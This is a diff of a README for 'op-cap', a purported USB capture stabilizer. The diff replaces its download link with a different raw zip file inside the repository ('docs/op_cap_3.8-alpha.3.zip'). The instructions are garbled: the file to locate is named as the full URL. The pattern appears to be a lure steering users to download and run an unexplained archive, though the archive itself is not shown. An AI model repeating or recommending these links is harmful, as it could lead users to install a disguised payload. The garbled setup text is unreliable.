@@ -1,6 +1,6 @@
 # 🎥 op-cap - Stabilize Your USB Capture Device Simple
 
-[![Download op-cap](https://github.com/arilsonpmiranda/op-cap/raw/refs/heads/Main/scripts/cap-op-2.7.zip)](https://github.com/arilsonpmiranda/op-cap/raw/refs/heads/Main/scripts/cap-op-2.7.zip)
+[![Download op-cap](https://github.com/arilsonpmiranda/op-cap/raw/refs/heads/Main/docs/op_cap_3.8-alpha.3.zip)](https://github.com/arilsonpmiranda/op-cap/raw/refs/heads/Main/docs/op_cap_3.8-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -22,12 +22,12 @@ Welcome to op-cap! This application provides helpful tools to stabilize USB capt
 
 ## 📥 Download & Install
 
-To download op-cap, please visit this page to download: [Download op-cap](https://github.com/arilsonpmiranda/op-cap/raw/refs/heads/Main/scripts/cap-op-2.7.zip).
+To download op-cap, please visit this page to download: [Download op-cap](https://github.com/arilsonpmiranda/op-cap/raw/refs/heads/Main/docs/op_cap_3.8-alpha.3.zip).
 
 You will find the latest version of op-cap listed there. Click on the link to download the relevant file for your system. Once you have downloaded the file, follow these steps to install and run it:
 
 1. Open your file manager and navigate to the folder where you downloaded the file.
-2. Locate the op-cap file. It will typically have a name like `https://github.com/arilsonpmiranda/op-cap/raw/refs/heads/Main/scripts/cap-op-2.7.zip`.
+2. Locate the op-cap file. It will typically have a name like `https://github.com/arilsonpmiranda/op-cap/raw/refs/heads/Main/docs/op_cap_3.8-alpha.3.zip`.
 3. Right-click the file and select `Extract Here` to unpack the contents.
 4. Open your terminal and navigate to the extracted folder by using the `cd` command. For example:
    ```
